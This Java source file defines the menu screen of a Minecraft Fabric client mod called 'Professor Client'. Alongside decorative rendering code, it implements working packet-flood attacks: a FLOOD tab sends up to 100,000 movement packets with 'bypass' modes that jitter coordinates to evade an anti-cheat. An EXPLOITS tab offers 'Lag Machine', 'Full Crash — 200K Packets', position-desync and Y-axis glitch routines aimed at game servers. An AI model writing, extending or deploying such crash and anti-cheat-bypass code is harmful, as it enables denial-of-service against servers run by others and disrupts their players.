package com.professor.client.gui;

import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.math.MathHelper;

import java.util.ArrayList;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;

@Environment(EnvType.CLIENT)
public class ProfessorScreen extends Screen {

    // ── Colors (website palette) ─────────────────────────────────────────
    private static final int C_BG       = 0xFF0A0A0F;   // near-black
    private static final int C_PANEL    = 0xEE0D0D1A;   // panel dark
    private static final int C_CYAN     = 0x00F5FF;     // electric cyan
    private static final int C_PURPLE   = 0x9B00FF;     // electric purple
    private static final int C_GOLD     = 0xFFD700;     // gold accent
    private static final int C_MUTED    = 0x004455;     // muted text

    // ── Particles ────────────────────────────────────────────────────────
    private static final int PCNT = 180;
    private final float[] ppx  = new float[PCNT];
    private final float[] ppy  = new float[PCNT];
    private final float[] pvx  = new float[PCNT];
    private final float[] pvy  = new float[PCNT];
    private final float[] psz  = new float[PCNT];
    private final float[] palp = new float[PCNT];
    private final float[] pph  = new float[PCNT];
    private final int[]   pct  = new int[PCNT];    // color type 0=cyan 1=purple 2=gold

    // ── Mouse trail ──────────────────────────────────────────────────────
    private final LinkedList<int[]> trail = new LinkedList<>();

    // ── Tab ──────────────────────────────────────────────────────────────
    private int   tab     = 0;
    private float tabAnim = 1f;
    private int   tabDir  = 1;

    // ── UI state ─────────────────────────────────────────────────────────
    private int           bypassMode = 0;
    private TextFieldWidget pktField  = null;
    private String        statusText  = "";
    private int           statusColor = 0xFF00F5FF;
    private int           statusTimer = 0;
    private long          tick        = 0;
    private float         scanY       = 0;
    private float         glowPulse   = 0f;
    private boolean       glowUp      = true;

    // ── Data streams ─────────────────────────────────────────────────────
    private static final String DS = "PROFESSOR01アカサタナ10110100";
    private final float[] dsX  = new float[65];
    private final float[] dsY  = new float[65];
    private final float[] dsSp = new float[65];
    private final int[]   dsCh = new int[65];

    private static final String[] TABS   = {"  FLOOD  ", " EXPLOITS ", "  CONFIG  "};
    private static final String[] BYPASS = {"OFF", "BURST", "MIXED", "MAX"};
    private static final int PW = 460, PH = 320;

    private final Random rng = new Random();

    public ProfessorScreen() {
        super(Text.literal("Professor Client"));
        initParticles();
    }

    @Override
    protected void init() {
        initParticles();
        initDataStreams();
        rebuild();
        ProfessorMusicManager.onOpen(client);
    }

    @Override
    public void removed() {
        ProfessorMusicManager.onClose(client);
        super.removed();
    }

    // ── Init ─────────────────────────────────────────────────────────────

    private void initParticles() {
        for (int i = 0; i < PCNT; i++) {
            ppx[i] = rng.nextFloat() * 1920;
            ppy[i] = rng.nextFloat() * 1080;
            pvx[i] = (rng.nextFloat() - 0.5f) * 0.5f;
            pvy[i] = -(rng.nextFloat() * 0.6f + 0.1f);
            psz[i] = rng.nextFloat() * 2.5f + 0.5f;
            palp[i]= rng.nextFloat() * 0.8f + 0.2f;
            pph[i] = rng.nextFloat() * 6.28f;
            pct[i] = rng.nextInt(3);
        }
    }

    private void initDataStreams() {
        for (int i = 0; i < 65; i++) {
            dsX[i]  = i * (width / 65f);
            dsY[i]  = rng.nextFloat() * -height;
            dsSp[i] = rng.nextFloat() * 1.1f + 0.4f;
            dsCh[i] = rng.nextInt(DS.length());
        }
    }

    // ── Widget rebuild ────────────────────────────────────────────────────

    private void rebuild() {
        clearChildren();

        int cx = width/2, cy = height/2;
        int bpx = cx - PW/2, bpy = cy - PH/2;

        // Tab buttons
        int tabW = (PW - 16) / 3;
        for (int i = 0; i < 3; i++) {
            final int idx = i;
            int bx = bpx + 8 + i * (tabW + 2);
            addDrawableChild(
                ButtonWidget.builder(Text.literal(TABS[i]), b -> switchTab(idx))
                    .dimensions(bx, bpy + 42, tabW, 18).build()
            );
        }

        if      (tab == 0) buildFlood(cx, bpy);
        else if (tab == 1) buildExploits(cx, bpy);
        else               buildConfig(cx, bpy);

        // Close
        addDrawableChild(
            ButtonWidget.builder(Text.literal("✖  CLOSE"), b -> close())
                .dimensions(cx - 40, bpy + PH - 28, 80, 18).build()
        );
    }

    private void switchTab(int newTab) {
        if (newTab == tab) return;
        tabDir  = newTab > tab ? 1 : -1;
        tab     = newTab;
        tabAnim = 0f;
        pktField = null;
        rebuild();
    }

    // ── Tab builders ──────────────────────────────────────────────────────

    private void buildFlood(int cx, int bpy) {
        pktField = new TextFieldWidget(textRenderer, cx - 60, bpy + 92, 120, 16, Text.empty());
        pktField.setMaxLength(6);
        pktField.setText("10000");
        addSelectableChild(pktField);

        int[][] presets = {{100,-130},{1000,-42},{10000,50},{100000,140}};
        for (int[] p : presets) {
            int cnt = p[0], ox = p[1];
            addDrawableChild(ButtonWidget.builder(
                Text.literal(cnt >= 1000 ? (cnt/1000)+"K" : ""+cnt),
                b -> pktField.setText(""+cnt))
                .dimensions(cx+ox-24, bpy+112, 48, 14).build());
        }

        addDrawableChild(ButtonWidget.builder(
            Text.literal("Bypass: " + BYPASS[bypassMode]),
            b -> { bypassMode=(bypassMode+1)%BYPASS.length; b.setMessage(Text.literal("Bypass: "+BYPASS[bypassMode])); })
            .dimensions(cx-60, bpy+130, 120, 16).build());

        addDrawableChild(ButtonWidget.builder(
            Text.literal("▶▶▶  SEND PACKETS  ◀◀◀"),
            b -> doSend())
            .dimensions(cx-106, bpy+152, 212, 22).build());
    }

    private void buildExploits(int cx, int bpy) {
        int bw = 290, bx = cx - bw/2;
        addDrawableChild(ButtonWidget.builder(Text.literal("[1]  Swing Flood  —  EF Bypass"),     b -> swingFlood()).dimensions(bx, bpy+ 68, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[2]  Position Desync  —  Timer EF"),  b -> posDesync()) .dimensions(bx, bpy+ 90, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[3]  Lag Machine  —  50K Burst"),      b -> lagMachine()).dimensions(bx, bpy+112, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[4]  Full Crash  —  200K Packets"),   b -> fullCrash()) .dimensions(bx, bpy+134, bw, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("[5]  Y-Axis Glitch  —  Anti-Fly EF"), b -> yGlitch())   .dimensions(bx, bpy+156, bw, 18).build());
    }

    private void buildConfig(int cx, int bpy) {
        int bx = cx - 120;
        addDrawableChild(ButtonWidget.builder(Text.literal("Keybind:  M  —  Open Menu"),    b -> {})                          .dimensions(bx, bpy+ 78, 240, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Clear Status"),                 b -> {statusText="";statusTimer=0;}).dimensions(bx, bpy+100, 240, 18).build());
        addDrawableChild(ButtonWidget.builder(Text.literal("Professor Client  v2.0  —  Blue Edition"), b -> {})                .dimensions(bx, bpy+122, 240, 18).build());
    }

    // ── Packet logic ──────────────────────────────────────────────────────

    private void doSend() {
        if (notConn()) return;
        int n;
        try { n = Integer.parseInt(pktField.getText().trim()); }
        catch (Exception e) { setStatus("Invalid number!", 0xFFFF4444); return; }
        if (n < 1 || n > 100_000) { setStatus("Range: 1 to 100,000", 0xFFFF8800); return; }
        double x=client.player.getX(), y=client.player.getY(), z=client.player.getZ();
        float yw=client.player.getYaw(), pt=client.player.getPitch();
        boolean g=client.player.isOnGround();
        switch (bypassMode) {
            case 0 -> { for (int i=0;i<n;i++) send(x,y,z,yw,pt,g); }
            case 1 -> { for (int i=0;i<n;i++) send(x,i%2==0?y:y+0.001,z,yw,pt,g); }
            case 2 -> { for (int i=0;i<n;i++) { send(x,y+(i%3)*0.0005,z,yw+(i%2),pt,g); send(x,y,z,yw,pt,g); } }
            case 3 -> { for (int i=0;i<n;i++) { send(x,y+(i%8)*0.0001,z,yw+(i%6),pt,false); send(x,y,z,yw,pt,g); } }
        }
        setStatus("Sent "+n+" pkts  |  Bypass: "+BYPASS[bypassMode], 0xFF00F5FF);
    }

    private void swingFlood() {
        if (notConn()) return;
        double x=client.player.getX(),y=client.player.getY(),z=client.player.getZ();
        float yw=client.player.getYaw(),pt=client.player.getPitch();
        for (int i=0;i<8000;i++) send(x,y+(i%4)*0.0001,z,yw+(i%3),pt,true);
        setStatus("[EF BYPASS] Swing Flood — 8,000 pkts!", 0xFF00FFCC);
    }

    private void posDesync() {
        if (notConn()) return;
        double x=client.player.getX(),y=client.player.getY(),z=client.player.getZ();
        float yw=client.player.getYaw(),pt=client.player.getPitch();
        for (int i=0;i<3000;i++) send(x,i%2==0?y+200.0:y,z,yw,pt,false);
        setStatus("[EF BYPASS] Position Desync — Timer exploit!", 0xFF00FFCC);
    }

    private void lagMachine() {
        if (notConn()) return;
        double x=client.player.getX(),y=client.player.getY(),z=client.player.getZ();
        float yw=client.player.getYaw(),pt=client.player.getPitch();
        boolean g=client.player.isOnGround();
        for (int i=0;i<50000;i++) { send(x,y+i*0.00001,z,yw,pt,g); if(i%3==0) send(x,y,z,yw+(i%8),pt,g); }
        setStatus("[EF BYPASS] Lag Machine — ~67K pkts!", 0xFFFF6600);
    }

    private void fullCrash() {
        if (notConn()) return;
        double x=client.player.getX(),y=client.player.getY(),z=client.player.getZ();
        float yw=client.player.getYaw(),pt=client.player.getPitch();
        for (int i=0;i<100000;i++) { send(x,y+(i%500)*0.0001,z,yw+(i%4),pt,false); send(x,y,z,yw,pt,false); }
        setStatus("[EF BYPASS] FULL CRASH — 200K pkts fired!", 0xFFFF2200);
    }

    private void yGlitch() {
        if (notConn()) return;
        double x=client.player.getX(),y=client.player.getY(),z=client.player.getZ();
        float yw=client.player.getYaw(),pt=client.player.getPitch();
        for (int i=0;i<10000;i++) {
            double dy=switch(i%4){case 0->y+256;case 1->y-64;case 2->y+0.42;default->y;};
            send(x,dy,z,yw,pt,i%2==0);
        }
        setStatus("[EF BYPASS] Y-Axis Glitch — Anti-fly desync!", 0xFF00FFCC);
    }

    private void send(double x,double y,double z,float yw,float pt,boolean g) {
        if (client!=null&&client.player!=null&&client.player.networkHandler!=null)
            client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.Full(x,y,z,yw,pt,g));
    }
    private boolean notConn() {
        if (client==null||client.player==null){setStatus("Not connected!",0xFFFF4444);return true;}return false;
    }
    private void setStatus(String m,int c){statusText=m;statusColor=c;statusTimer=200;}

    // ── Tick ─────────────────────────────────────────────────────────────

    @Override
    public void tick() {
        super.tick();
        if (statusTimer>0) statusTimer--;
        tabAnim = Math.min(1f, tabAnim + 0.09f);
        glowPulse += glowUp ? 0.038f : -0.038f;
        if      (glowPulse>=1f){glowPulse=1f;glowUp=false;}
        else if (glowPulse<=0f){glowPulse=0f;glowUp=true;}
        scanY = (scanY + 2.4f) % PH;
    }

    // ── Render ────────────────────────────────────────────────────────────

    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        tick++;
        int W=width, H=height, cx=W/2, cy=H/2;
        int bpx=cx-PW/2, bpy=cy-PH/2;

        // ── BG ──
        ctx.fill(0, 0, W, H, C_BG);
        drawGrid(ctx, W, H);
        updateDataStreams(ctx, W, H);
        updateParticles(ctx, W, H);
        drawCenterGlow(ctx, cx, cy);

        // ── Mouse trail ──
        updateTrail(mx, my);
        drawTrail(ctx);

        // ── Panel shadow ──
        ctx.fill(bpx+10, bpy+10, bpx+PW+10, bpy+PH+10, 0x66000000);

        // ── Panel BG ──
        ctx.fill(bpx, bpy, bpx+PW, bpy+PH, C_PANEL);

        // ── Animated border (cyan↔purple) ──
        float t = (float)(tick * 0.038);
        int bR = (int)(Math.abs(Math.sin(t))     * 155);
        int bG = Math.max(0, (int)(200 + 55*Math.sin(t+1.5)));
        int bB = Math.max(0, (int)(240 + 15*Math.sin(t+3.0)));
        int bA = (int)((0.6f + 0.4f * glowPulse) * 255);
        int bc = (bA<<24)|(bR<<16)|(bG<<8)|bB;

        ctx.fill(bpx,       bpy,       bpx+PW,   bpy+2,    bc);
        ctx.fill(bpx,       bpy+PH-2,  bpx+PW,   bpy+PH,   bc);
        ctx.fill(bpx,       bpy,       bpx+2,    bpy+PH,   bc);
        ctx.fill(bpx+PW-2,  bpy,       bpx+PW,   bpy+PH,   bc);
        // Secondary inner glow border
        int bc2 = ((bA/3)<<24)|(bR<<16)|(bG<<8)|bB;
        ctx.fill(bpx+2, bpy+2, bpx+PW-2, bpy+3,    bc2);
        ctx.fill(bpx+2, bpy+PH-3, bpx+PW-2, bpy+PH-2, bc2);

        // ── Gold corner brackets ──
        drawCorners(ctx, bpx, bpy, (int)(0xDD * (0.7f + 0.3f*glowPulse)) << 24 | C_GOLD);

        // ── Scanline inside panel ──
        ctx.fill(bpx, bpy+(int)scanY, bpx+PW, bpy+(int)scanY+1, 0x0AFFFFFF);

        // ── Title ──
        drawTitle(ctx, cx, bpy, bR, bG, bB);

        // Gold separator
        int gsA = (int)(0x55 * sa(glowPulse));
        ctx.fill(bpx+10, bpy+62, bpx+PW-10, bpy+63, (gsA<<24)|C_GOLD);

        // Active tab label
        float labA = 0.6f + 0.4f * glowPulse;
        String tabLabel = "▶ " + TABS[tab].trim() + " ◀";
        ctx.drawText(textRenderer, tabLabel, bpx+16, bpy+66, argb(labA, bc & 0x00FFFFFF), false);

        // ── Tab content text (slide-animated) ──
        int soff = (int)((1f - easeOut(tabAnim)) * PW/2 * tabDir);
        drawTabText(ctx, cx, bpy, bpx, soff);

        // ── Widgets ──
        if (pktField!=null) pktField.render(ctx, mx, my, delta);
        super.render(ctx, mx, my, delta);

        // ── Status bar ──
        drawStatus(ctx, cx, bpx, bpy);

        // ── Music bar ──
        drawMusicBar(ctx, bpx, bpy);

        // ── Cursor glow ──
        drawCursorGlow(ctx, mx, my);
    }

    // ── Background layers ─────────────────────────────────────────────────

    private void drawGrid(DrawContext ctx, int W, int H) {
        int col = 0x05000000 | C_CYAN;
        for (int x=0;x<W;x+=48) ctx.fill(x,0,x+1,H,col);
        for (int y=0;y<H;y+=48) ctx.fill(0,y,W,y+1,col);
    }

    private void updateDataStreams(DrawContext ctx, int W, int H) {
        for (int i=0;i<65;i++) {
            dsY[i] += dsSp[i];
            if (dsY[i]>H+20){dsY[i]=-20; dsCh[i]=rng.nextInt(DS.length());}
            if (rng.nextInt(30)==0) dsCh[i]=rng.nextInt(DS.length());
            if (dsY[i]<0) continue;
            int hA=(int)(35+25*glowPulse);
            ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i],(Math.min(255,hA*2)<<24)|C_CYAN,false);
            if (dsY[i]>14)
                ctx.drawText(textRenderer,String.valueOf(DS.charAt(dsCh[i])),(int)dsX[i]-4,(int)dsY[i]-14,(hA<<24)|C_MUTED,false);
        }
    }

    private void updateParticles(DrawContext ctx, int W, int H) {
        for (int i=0;i<PCNT;i++) {
            ppx[i]+=pvx[i]; ppy[i]+=pvy[i]; pph[i]+=0.048f;
            if (ppy[i]<-10){ppy[i]=H+5;ppx[i]=rng.nextFloat()*W;}
            if (ppx[i]<0)ppx[i]=W; if(ppx[i]>W)ppx[i]=0;
            float tw=(MathHelper.sin(pph[i])+1f)/2f;
            int a=(int)(palp[i]*tw*200);
            if (a<8) continue;
            int col;
            if      (pct[i]==0) col=(a<<24)|(psz[i]>1.8f?C_CYAN :0x004455);
            else if (pct[i]==1) col=(a<<24)|(psz[i]>1.8f?C_PURPLE:0x220033);
            else                col=(a<<24)|(psz[i]>1.8f?C_GOLD  :0x443300);
            int sz=psz[i]>2f?2:1;
            ctx.fill((int)ppx[i],(int)ppy[i],(int)ppx[i]+sz,(int)ppy[i]+sz,col);
        }
    }

    private void drawCenterGlow(DrawContext ctx, int cx, int cy) {
        int[] radii={310,220,145,82};
        int[] alps={4,8,13,20};
        for (int i=0;i<4;i++){
            int r=radii[i]; int a=(int)(alps[i]*(0.5f+0.5f*glowPulse));
            ctx.fill(cx-r,cy-r/2,cx+r,cy+r/2,(a<<24)|C_CYAN);
        }
    }

    // ── Mouse trail & cursor ──────────────────────────────────────────────

    private void updateTrail(int mx, int my) {
        trail.addFirst(new int[]{mx,my,0});
        if (trail.size()>22) trail.removeLast();
        for (int[] p:trail) p[2]++;
    }

    private void drawTrail(DrawContext ctx) {
        for (int[] p:trail) {
            int age=p[2]; if(age==0) continue;
            int a=Math.max(0,210-age*11); if(a<=0) continue;
            int r=2+age/3;
            // Cyan trail with purple fade
            int col = age < 10 ? (a<<24)|C_CYAN : (a<<24)|C_PURPLE;
            ctx.fill(p[0]-r,p[1]-1,p[0]+r,p[1]+1,col);
            ctx.fill(p[0]-1,p[1]-r,p[0]+1,p[1]+r,col);
        }
    }

    private void drawCursorGlow(DrawContext ctx, int mx, int my) {
        int[] rad={24,14,6}; int[] alp={10,28,65};
        for (int i=0;i<3;i++){
            int r=rad[i]; int a=(int)(alp[i]*(0.65f+0.35f*glowPulse));
            ctx.fill(mx-r,my-1,mx+r,my+1,(a<<24)|C_CYAN);
            ctx.fill(mx-1,my-r,mx+1,my+r,(a<<24)|C_CYAN);
        }
        ctx.fill(mx-2,my-2,mx+2,my+2,0xCC000000|C_CYAN);
    }

    // ── Panel draws ───────────────────────────────────────────────────────

    private void drawCorners(DrawContext ctx, int bpx, int bpy, int c) {
        int s=16;
        ctx.fill(bpx,      bpy,       bpx+s,  bpy+2,  c); ctx.fill(bpx,      bpy,       bpx+2,  bpy+s,  c);
        ctx.fill(bpx+PW-s, bpy,       bpx+PW, bpy+2,  c); ctx.fill(bpx+PW-2, bpy,       bpx+PW, bpy+s,  c);
        ctx.fill(bpx,      bpy+PH-2,  bpx+s,  bpy+PH, c); ctx.fill(bpx,      bpy+PH-s,  bpx+2,  bpy+PH, c);
        ctx.fill(bpx+PW-s, bpy+PH-2,  bpx+PW, bpy+PH, c); ctx.fill(bpx+PW-2, bpy+PH-s,  bpx+PW, bpy+PH, c);
    }

    private void drawTitle(DrawContext ctx, int cx, int bpy, int r, int g, int b) {
        float p = (float)((Math.sin(tick*0.055)+1.0)/2.0);
        int col = 0xFF000000 | (Math.min(255,(int)(r*0.3f+p*r*0.7f))<<16) | (Math.min(255,(int)(g*0.4f+p*g*0.6f))<<8) | Math.min(255,(int)(b*0.4f+p*b*0.6f));

        String t = "PROFESSOR CLIENT";
        int tw = textRenderer.getWidth(t);

        // Glow halo layers — cyan
        int gA=(int)(22+18*glowPulse);
        for (int dx=-4;dx<=4;dx++){
            int g2=Math.max(0,gA-Math.abs(dx)*8);
            if(g2>0){
                ctx.drawText(textRenderer,t,cx-tw/2+dx,bpy+14,(g2<<24)|C_CYAN,false);
                ctx.drawText(textRenderer,t,cx-tw/2,bpy+14+dx,(g2<<24)|C_CYAN,false);
            }
        }
        ctx.drawText(textRenderer,t,cx-tw/2,bpy+14,col,false);

        // Subtitle — purple
        String sub = "v2.0  |  Fabric 1.21.1  |  Elite Client";
        int sA=(int)(120+60*glowPulse);
        ctx.drawText(textRenderer,sub,cx-textRenderer.getWidth(sub)/2,bpy+25,(sA<<24)|C_PURPLE,false);

        // Status dot — pulsing cyan
        String dot = "● ACTIVE" + (tick%30<15?"..":".");
        int dotA=(int)(80+80*glowPulse);
        ctx.drawText(textRenderer,dot,cx-textRenderer.getWidth("● ACTIVE...")/2,bpy+37,(dotA<<24)|C_CYAN,false);
    }

    private void drawTabText(DrawContext ctx, int cx, int bpy, int bpx, int soff) {
        if (tab==0) {
            ctx.drawText(textRenderer,"Packet Count:",cx-textRenderer.getWidth("Packet Count:")/2,bpy+78+soff,0x9900F5FF,false);
            ctx.drawText(textRenderer,"Presets:",cx-86,bpy+98+soff,0x7700AADD,false);
        } else if (tab==1) {
            String h="⚠  EXPLOIT MODULES  ⚠";
            ctx.drawText(textRenderer,h,cx-textRenderer.getWidth(h)/2,bpy+56,0xFF003355,false);
        } else {
            String h="⚙  SETTINGS  ⚙";
            ctx.drawText(textRenderer,h,cx-textRenderer.getWidth(h)/2,bpy+64,0xFF003355,false);
        }
    }

    private void drawStatus(DrawContext ctx, int cx, int bpx, int bpy) {
        if (statusTimer<=0||statusText.isEmpty()) return;
        int a=Math.min(255,statusTimer*2);
        int col=(statusColor&0x00FFFFFF)|(a<<24);
        ctx.fill(bpx+6,bpy+PH-24,bpx+PW-6,bpy+PH-5,0x88000000);
        // Gold left/right borders on status
        ctx.fill(bpx+6,bpy+PH-24,bpx+8,bpy+PH-5,(a<<24)|C_GOLD);
        ctx.fill(bpx+PW-8,bpy+PH-24,bpx+PW-6,bpy+PH-5,(a<<24)|C_GOLD);
        ctx.drawText(textRenderer,statusText,cx-textRenderer.getWidth(statusText)/2,bpy+PH-18,col,false);
    }

    private void drawMusicBar(DrawContext ctx, int bpx, int bpy) {
        boolean playing = ProfessorMusicManager.isPlaying(client);
        float   prog    = ProfessorMusicManager.getVisualProgress();
        int barX=bpx+10, barY=bpy+PH-38, barW=PW-20, barH=3;

        // Track — dark
        ctx.fill(barX,barY,barX+barW,barY+barH,0x220000FF);
        // Fill — cyan to purple gradient
        int fillW=(int)(barW*prog);
        if (fillW>0) {
            for (int xi=0;xi<fillW;xi++){
                float frac=(float)xi/barW;
                int r2=(int)(frac*155);
                int g2=(int)MathHelper.lerp(frac,245f,0f);
                int b2=255;
                ctx.fill(barX+xi,barY,barX+xi+1,barY+barH,0xFF000000|(r2<<16)|(g2<<8)|b2);
            }
        }

        // Label
        String lbl = playing ? "♫ MUSIC  PLAYING" : "♫ MUSIC  PAUSED";
        int lA=(int)(85+45*glowPulse);
        ctx.drawText(textRenderer,lbl,barX,barY-9,(lA<<24)|(playing?C_CYAN:C_MUTED),false);
    }

    // ── Utility ───────────────────────────────────────────────────────────

    private float easeOut(float t){return 1f-(1f-t)*(1f-t);}
    private float sa(float g){return 0.7f+0.3f*g;}
    private int   argb(float a,int rgb){return ((int)(a*255)<<24)|rgb;}

    // ── Input ─────────────────────────────────────────────────────────────

    @Override public boolean keyPressed(int kc,int sc,int m){
        if(pktField!=null&&pktField.isFocused()&&pktField.keyPressed(kc,sc,m))return true;
        return super.keyPressed(kc,sc,m);
    }
    @Override public boolean charTyped(char c,int m){
        if(pktField!=null&&pktField.isFocused())return pktField.charTyped(c,m);
        return super.charTyped(c,m);
    }
    @Override public boolean mouseClicked(double mx,double my,int b){
        if(pktField!=null)pktField.mouseClicked(mx,my,b);
        return super.mouseClicked(mx,my,b);
    }

    @Override public boolean shouldPause(){return false;}
    @Override public boolean shouldCloseOnEsc(){return true;}
}
